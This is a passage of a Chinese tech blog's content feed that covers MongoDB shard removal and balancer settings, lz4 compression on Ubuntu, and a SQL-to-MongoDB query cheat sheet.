} )</code>检查数据迁移状态，返回如下</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">"msg"</span> : <span class="string">"draining ongoing"</span>,</span><br><span class="line">        <span class="attr">"state"</span> : <span class="string">"ongoing"</span>,</span><br><span class="line">        <span class="attr">"remaining"</span> : &#123;</span><br><span class="line">                <span class="attr">"chunks"</span> : NumberLong(<span class="number">0</span>),</span><br><span class="line">                <span class="attr">"dbs"</span> : NumberLong(<span class="number">1</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"note"</span> : <span class="string">"you need to drop or movePrimary these databases"</span>,</span><br><span class="line">        <span class="attr">"dbsToMove"</span> : [</span><br><span class="line">                <span class="string">"test_admin"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"ok"</span> : <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的remainning是必须迁移到其他分片剩余的数据块（chunks）和这个分片上未分片（primary）的数据库数量</p><h4 id="3-1-3直到chunks为零以后，将未分片的数据迁移到其他分片-可能会花费一定的时间-，倘若该数据库没用也可直接删除"><a href="#3-1-3直到chunks为零以后，将未分片的数据迁移到其他分片-可能会花费一定的时间-，倘若该数据库没用也可直接删除" class="headerlink" title="3.1.3直到chunks为零以后，将未分片的数据迁移到其他分片(可能会花费一定的时间)，倘若该数据库没用也可直接删除"></a>3.1.3直到chunks为零以后，将未分片的数据迁移到其他分片(可能会花费一定的时间)，倘若该数据库没用也可直接删除</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.runCommand</span>( &#123; <span class="attribute">movePrimary</span>: <span class="string">"test_admin"</span>, to: <span class="string">"shard0001"</span> &#125;)</span><br></pre></td></tr></table></figure><p>迁移成功后返回如下：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">"primary"</span> : <span class="string">"shard0001:127.0.0.1:100002"</span>, <span class="attr">"ok"</span> : <span class="number">1</span> &#125;</span><br></pre></td></tr></table></figure></p><h4 id="3-1-4完成上一步之后再次执行db-runCommand-removeShard-quot-shard000-quot-得到如下返回即为成功删除该分片"><a href="#3-1-4完成上一步之后再次执行db-runCommand-removeShard-quot-shard000-quot-得到如下返回即为成功删除该分片" class="headerlink" title="3.1.4完成上一步之后再次执行db.runCommand( { removeShard: &quot;shard000&quot; } ),得到如下返回即为成功删除该分片"></a>3.1.4完成上一步之后再次执行<code>db.runCommand( { removeShard: &quot;shard000&quot; } )</code>,得到如下返回即为成功删除该分片</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">"msg"</span> : <span class="string">"removeshard completed successfully"</span>,</span><br><span class="line">        <span class="attr">"state"</span> : <span class="string">"completed"</span>,</span><br><span class="line">        <span class="attr">"shard"</span> : <span class="string">"shard0001"</span>,</span><br><span class="line">        <span class="attr">"ok"</span> : <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2均衡器配置"><a href="#3-2均衡器配置" class="headerlink" title="3.2均衡器配置"></a>3.2均衡器配置</h3><h4 id="3-2-1均衡器的操作"><a href="#3-2-1均衡器的操作" class="headerlink" title="3.2.1均衡器的操作"></a>3.2.1均衡器的操作</h4><p>由于均衡器工作时会影响性能，通常在操作前关闭均衡器，操作之后再开启均衡器（备份期间要保证均衡过程一定不能运行）<br>1.查看均衡器状态：<code>sh.getBalancerState()</code><br>2.开启均衡器：<code>sh.setBalancerState(true)</code><br>3.关闭均衡器：<code>sh.setBalancerState(false)</code>或者<code>sh.stopBalancer()</code></p><h4 id="3-2-2检查均衡锁的状态"><a href="#3-2-2检查均衡锁的状态" class="headerlink" title="3.2.2检查均衡锁的状态"></a>3.2.2检查均衡锁的状态</h4><p>连接mongos,切换到config库，执行命令，过程如下（也可以通过sh.status()的balancer字段判断）<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">use config</span><br><span class="line">db.locks.<span class="builtin-name">find</span>( &#123; _id : <span class="string">"balancer"</span> &#125; ).pretty()</span><br></pre></td></tr></table></figure></p><p>返回如下信息<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">"_id"</span> : <span class="string">"balancer"</span>,</span><br><span class="line">        <span class="attr">"state"</span> : <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"who"</span> : <span class="string">"localhost:27017:1469031212:1501674588:Balancer:1603386966"</span>,</span><br><span class="line">        <span class="attr">"ts"</span> : ObjectId(<span class="string">"578fde70a8fc7b3ad5b2635d"</span>),</span><br><span class="line">        <span class="attr">"process"</span> : <span class="string">"localhost:27017:1469031212:1501674588"</span>,</span><br><span class="line">        <span class="attr">"when"</span> : ISODate(<span class="string">"2016-07-20T20:26:24.238Z"</span>),</span><br><span class="line">        <span class="attr">"why"</span> : <span class="string">"doing balance round"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中state 值为0表明不存在锁；在mongos2.0以后版本,值为2表明存在锁,之前的版本,值为 1 表明存在锁</p>]]></content>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubuntu压缩/解压lz4文件</title>
      <link href="/2016/07/20/Ubuntu_lz4/"/>
      <url>/2016/07/20/Ubuntu_lz4/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;lz4压缩算法致力于提高压缩和解压的速度,项目中接触到lz4压缩的文件，这里介绍如何在Ubuntu下进行lz4文件的压缩与解压<br><a id="more"></a></p><h2 id="0x01安装"><a href="#0x01安装" class="headerlink" title="0x01安装"></a>0x01安装</h2><p><a href="http://manpages.ubuntu.com/manpages/wily/man1/lz4.1.html" target="_blank" rel="noopener">安装</a>命令如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install liblz4-tool</span><br></pre></td></tr></table></figure></p><h2 id="0x02使用"><a href="#0x02使用" class="headerlink" title="0x02使用"></a>0x02使用</h2><p>1.快速压缩文件：<code>lz4 test.txt</code><br>2.解压lz4文件：<code>lz4 -d test.lz4</code><br>3.更多用法，执行<code>lz4 -h</code>如下：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Usage :</span><br><span class="line">      lz4 [arg] [input] [output]</span><br><span class="line"></span><br><span class="line">input   : a filename</span><br><span class="line">          with no FILE, or when FILE is - or stdin, read standard input</span><br><span class="line">Arguments :</span><br><span class="line"> -<span class="ruby"><span class="number">1</span>     : Fast compression (default)</span></span><br><span class="line"><span class="ruby"> -<span class="number">9</span>     : High compression</span></span><br><span class="line"><span class="ruby"> -d     : decompression (default <span class="keyword">for</span> .lz4 extension)</span></span><br><span class="line"><span class="ruby"> -z     : force compression</span></span><br><span class="line"><span class="ruby"> -f     : overwrite output without prompting</span></span><br><span class="line"><span class="ruby"> -h/-H  : display help/long help <span class="keyword">and</span> exit</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">Advanced arguments <span class="symbol">:</span></span></span><br><span class="line"><span class="ruby"> -V     : display Version number <span class="keyword">and</span> exit</span></span><br><span class="line"><span class="ruby"> -v     : verbose mode</span></span><br><span class="line"><span class="ruby"> -q     : suppress warnings; specify twice to suppress errors too</span></span><br><span class="line"><span class="ruby"> -c     : force write to standard output, even <span class="keyword">if</span> it is the console</span></span><br><span class="line"><span class="ruby"> -t     : test compressed file integrity</span></span><br><span class="line"><span class="ruby"> -l     : compress using Legacy format (Linux kernel compression)</span></span><br><span class="line"><span class="ruby"> -B<span class="comment">#    : Block size [4-7](default : 7)</span></span></span><br><span class="line"><span class="ruby"> -BD    : Block dependency (improve compression ratio)</span></span><br><span class="line"><span class="ruby"> -BX    : enable block checksum (<span class="symbol">default:</span>disabled)</span></span><br><span class="line"><span class="ruby"> -Sx    : disable stream checksum (<span class="symbol">default:</span>enabled)</span></span><br><span class="line"><span class="ruby">Benchmark arguments <span class="symbol">:</span></span></span><br><span class="line"><span class="ruby"> -b     : benchmark file(s)</span></span><br><span class="line"><span class="ruby"> -i<span class="comment">#    : iteration loops [1-9](default : 3), benchmark mode only</span></span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MongoDB使用语法</title>
      <link href="/2016/07/11/MongoDB_usage/"/>
      <url>/2016/07/11/MongoDB_usage/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>&emsp;&emsp;经常使用MongoDB，这里整理一下查询语法，第一部分为SQL和MongoDB用法对照，第二部分为Mongo部分高级用法。PS：仅仅记录自己常用的，更高级的还是查看<a href="https://docs.mongodb.com/manual/crud/" target="_blank" rel="noopener">官方文档</a>吧！<br><a id="more"></a></p><h2 id="0x01-SQL-vs-MongoDB语法对应表"><a href="#0x01-SQL-vs-MongoDB语法对应表" class="headerlink" title="0x01 SQL vs MongoDB语法对应表"></a>0x01 SQL vs MongoDB语法对应表</h2><p>MongoDB号称最像SQL的非关系数据库，以下就是两者查询语句对应表<br>1.插入语句:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO<span class="built_in"> users </span>(user_id,age,status) VALUES (<span class="string">"bcd001"</span>,45,<span class="string">"A"</span> </span><br><span class="line">db<span class="built_in"> users </span>insert(&#123;user_id:<span class="string">"bcd001"</span>,age:45,status:<span class="string">"A"</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>2.查询语句</p><p>2.1 查询所有<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span></span><br><span class="line">db.users.<span class="builtin-name">find</span>()</span><br></pre></td></tr></table></figure></p><p>2.2 返回特定字段<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,user_id,status <span class="keyword">FROM</span><span class="built_in"> users </span>    </span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;&#125;,&#123;user_id:1,status:1&#125;)</span><br></pre></td></tr></table></figure></p><p>2.3 返回特定字段，且Mongodb不返回”_id”(“_id”默认都是返回的)<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT user_id,status <span class="keyword">FROM</span> users</span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;&#125;,&#123;user_id:1,status:1,_id:0&#125;)</span><br></pre></td></tr></table></figure></p><p>2.4 查询status=”A”<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE status =<span class="string">"A"</span>     </span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;status:<span class="string">"A"</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>2.5 查询status=”A”，限定返回字段user_id,status<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT user_id,status <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE status =<span class="string">"A"</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;status:<span class="string">"A"</span>&#125;,&#123;user_id:1,status:1,_id:0&#125;)</span><br></pre></td></tr></table></figure></p><p>2.6 查询status不等于A”<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE status !=<span class="string">"A"</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;status:&#123;<span class="variable">$ne</span>:<span class="string">"A"</span>&#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>2.7 查询status=”A”且age=50<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE status =<span class="string">"A"</span> <span class="keyword">AND</span> age = 50</span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;status:<span class="string">"A"</span>,age:50&#125;)</span><br></pre></td></tr></table></figure></p><p>2.8 查询status=”A”或者age=50<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE status =<span class="string">"A"</span> <span class="keyword">OR</span> <span class="attribute">age</span>=50</span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;<span class="variable">$or</span>:[&#123;status:<span class="string">"A"</span>&#125;,&#123;age:50&#125;]&#125;)</span><br></pre></td></tr></table></figure></p><p>2.9 查询age大于25<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE age &gt;25</span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;age:&#123;<span class="variable">$gt</span>:25&#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>2.10 查询age小于25<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE age&lt;25</span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;age:&#123;<span class="variable">$lt</span>:25&#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>2.11 查询age大于25且小于50<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE age &gt;25 <span class="keyword">AND</span> age&lt;=50</span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;age:&#123;<span class="variable">$gt</span>:25,<span class="variable">$lte</span>:50&#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>2.12 查询包含字符串”bc”（模糊匹配）<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE user_id like <span class="string">"%bc%"</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;user_id:/bc/&#125;)</span><br></pre></td></tr></table></figure></p><p>2.13 查询以”bc”字符串开头<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE user_id like <span class="string">"bc%"</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;user_id:/^bc/&#125;)</span><br></pre></td></tr></table></figure></p><p>2.14 查询status=”A”，并且按照user_id正序排序<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">status</span>=<span class="string">"A"</span> ORDER BY user_id ASC</span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;status:<span class="string">"A"</span>&#125;).sort(&#123;user_id:1&#125;)</span><br></pre></td></tr></table></figure></p><p>2.15 查询status=”A”，并且按照user_id逆序排序<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">status</span>=<span class="string">"A"</span>ORDER BY user_id DESC</span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;status:<span class="string">"A"</span>&#125;).sort(&#123;user_id:-1&#125;)</span><br></pre></td></tr></table></figure></p><p>2.16 计总数<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) <span class="keyword">FROM</span> users</span><br><span class="line">db.users.count()</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>().count()</span><br></pre></td></tr></table></figure></p><p>2.17 查询存在user_id的数据总数<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(user_id) <span class="keyword">FROM</span> users</span><br><span class="line">db.users.count(&#123;user_id:&#123;<span class="variable">$exists</span>:true&#125;&#125;)</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;user_id:&#123;<span class="variable">$exists</span>:true&#125;&#125;).count()</span><br></pre></td></tr></table></figure></p><p>2.18 查询age大于30的总数<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE age&gt;30</span><br><span class="line">db.users.count(&#123;age:&#123;<span class="variable">$gt</span>:30&#125;&#125;)</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;age:&#123;<span class="variable">$gt</span>:30&#125;&#125;).count()</span><br></pre></td></tr></table></figure></p><p>2.19 查询status字段的所有不同值（常用于得到某字段的取值范围）<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT(status) <span class="keyword">FROM</span> users</span><br><span class="line">db.users.distinct(<span class="string">"status"</span>)</span><br></pre></td></tr></table></figure></p><p>2.20 查询第一条数据<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT* <span class="keyword">FROM</span><span class="built_in"> users </span>LIMIT1</span><br><span class="line">db.users.findOne()</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>().limit(1)</span><br></pre></td></tr></table></figure></p><p>2.21 查询地10-15条数据<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>LIMIT 5 SKIP 10</span><br><span class="line">db.users.<span class="builtin-name">find</span>().limit(5).skip(10)</span><br></pre></td></tr></table></figure></p><p>2.22 显示查询相关的详细信息<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE status =<span class="string">"A"</span></span><br><span class="line">db.users.<span class="builtin-name">find</span>(&#123;status:<span class="string">"A"</span>&#125;).explain()</span><br></pre></td></tr></table></figure></p><p>3 更新语句<br>3.1 更新age&gt;25的数据设置status=”c”(注意：MongoDB中如果不指定multi:true则只更新满足要求的第一条数据)<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="builtin-name">SET</span> <span class="attribute">status</span>=<span class="string">"C"</span> WHERE age&gt;25</span><br><span class="line">db.users.update(&#123;age:&#123;<span class="variable">$gt</span>:25&#125;&#125;,&#123;<span class="variable">$set</span>:&#123;status:<span class="string">"C"</span>&#125;&#125;,&#123;multi:true&#125;)</span><br></pre></td></tr></table></figure></p><p>3.2 更新status=”A”的数据设置每个age加3<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE<span class="built_in"> users </span><span class="builtin-name">SET</span> <span class="attribute">age</span>=age+3 WHERE <span class="attribute">status</span>=<span class="string">"A"</span></span><br><span class="line">db.users.update(&#123;status:<span class="string">"A"</span>&#125;,&#123;<span class="variable">$inc</span>:&#123;age:3&#125;&#125;,&#123;mult:true&#125;)</span><br></pre></td></tr></table></figure></p><p>4 删除语句<br>4.1 删除status=”D”的数据<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DELETE <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">status</span>=<span class="string">"D"</span></span><br><span class="line">db.users.<span class="builtin-name">remove</span>(&#123;status:<span class="string">"D"</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>4.2 删除user表<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DELETE <span class="keyword">FROM</span> users</span><br><span class="line">db.users.<span class="builtin-name">remove</span>(&#123;&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="0x02-MongoDB特殊语法"><a href="#0x02-MongoDB特殊语法" class="headerlink" title="0x02 MongoDB特殊语法"></a>0x02 MongoDB特殊语法</h2><p>1 重命名字段名<br>(注：MongoDB更新字段名需要将所有数据重新写一遍，大数据下会耗费大量时间，笔者曾重写10亿级数据花了1周时间)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#重命名user_id为username</span></span><br><span class="line">db.rdns.update(&#123;&#125;, &#123;<span class="string">"<span class="variable">$rename</span>"</span>:&#123;<span class="string">"user_id"</span> : <span class="string">"user_name"</span>&#125;&#125;,<span class="literal">false</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><p>2 删除特定字段<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#删除age字段</span></span><br><span class="line">db.getCollection(<span class="string">'tags'</span>).update(&#123;&#125;,&#123;<span class="string">"<span class="variable">$unset</span>"</span>:&#123;<span class="string">"age"</span>:<span class="string">""</span>&#125;&#125;,&#123;multi:<span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>3 获取特定条件的某字段的去重结果值<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取age大于<span class="number">10</span>的status的去重结果</span><br><span class="line">db<span class="selector-class">.users</span><span class="selector-class">.distinct</span>(<span class="string">"status"</span>,&#123;<span class="string">"age"</span>:&#123;<span class="string">"$gt"</span>:<span class="number">10</span>&#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>4 建立索引<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#username字段建立索引</span><br><span class="line">db<span class="selector-class">.user</span><span class="selector-class">.ensureIndex</span>(&#123;<span class="string">"username"</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>5 建立稀疏索引<br>稀疏索引与普通索引的区别在于，不存在该字段的情况下，稀疏索引列表不包含该文档（document），而普通索引列表会包含，值为null<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#建立work.address的稀疏索引</span><br><span class="line">db<span class="selector-class">.user</span><span class="selector-class">.ensureIndex</span>(&#123;<span class="string">"work.address"</span>:<span class="number">1</span>&#125;,&#123;<span class="string">"sparse"</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>6 查询不存在某字段的数据<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询不存在work字段的数据</span></span><br><span class="line">db.user.<span class="builtin-name">find</span>(&#123;<span class="string">"work"</span>:&#123;<span class="string">"<span class="variable">$exists</span>"</span>:0&#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>7 查询嵌套字段数据<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">&#123;<span class="string">"_id"</span> : ObjectId(<span class="string">"57125d024a543fd09e73d411"</span>),</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  <span class="string">"work"</span>:&#123;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">      <span class="string">"address"</span>:<span class="string">"北京"</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">  &#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#125;</span></span><br><span class="line"></span><br><span class="line">db.user.find(&#123;"work.address":"北京"&#125;)</span><br></pre></td></tr></table></figure></p><p>8 查询数据组（直接查询即可）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">&#123;<span class="string">"_id"</span> : ObjectId(<span class="string">"57125d024a543fd09e73d411"</span>),</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string">"protocols"</span> : [ </span></span><br><span class="line"><span class="meta">#</span><span class="bash">        <span class="string">"https"</span>,</span></span><br><span class="line"><span class="meta">#</span><span class="bash">        <span class="string">"http"</span>,</span></span><br><span class="line"><span class="meta">#</span><span class="bash">        <span class="string">"ftp"</span>,</span></span><br><span class="line"><span class="meta">#</span><span class="bash">        <span class="string">"smtp"</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">    ]</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&#125;</span></span><br><span class="line"></span><br><span class="line">db.user.find(&#123;"protocols":"http"&#125;)</span><br></pre></td></tr></table></figure></p><p>9 查询_id<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#_id大于"57125d024a543fd09e73d411"</span></span><br><span class="line">db.user.<span class="builtin-name">find</span>(&#123;<span class="string">"_id"</span>:&#123;<span class="string">"<span class="variable">$gt</span>"</span>:ObjectId(<span class="string">"57125d024a543fd09e73d411"</span>&#125;&#125;)</span><br></pre></td></tr></table></figure></p><p>10 忽略大小写查询字符串<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.user.find(&#123;<span class="string">"username"</span><span class="symbol">:/wangWei/i</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>11 正则表达式查询<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.user.find(&#123;<span class="string">"username"</span><span class="symbol">:</span>&#123;<span class="string">"$regex"</span><span class="symbol">:/^ABC/i</span>&#125;&#125;)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
